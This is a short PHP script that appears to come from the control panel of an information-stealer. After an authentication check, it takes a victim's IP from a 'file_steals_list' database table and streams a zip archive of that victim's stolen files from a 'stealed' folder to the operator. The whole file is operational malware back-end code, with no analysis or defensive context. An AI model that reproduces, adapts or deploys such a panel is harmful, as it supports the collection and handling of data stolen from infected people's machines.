<?php
include('../class/include.php');
if (!Account::isAuthentified())
{
    die("Bad request");
}

$ips = $GLOBALS['DB']->GetContent('file_steals_list', ['id' => $_GET['ip']])[0]['ip'];
$ipl = explode(":", $ips);

header('Content-Type: application/zip');
header('Content-disposition: attachment; filename='."gblk_".$ips."filesteal.zip");
header('Content-Length: ' . filesize("../../beta/core/stealed/".$ipl[0]."filesteal.zip"));
readfile("../../beta/core/stealed/".$ipl[0]."filesteal.zip");
?>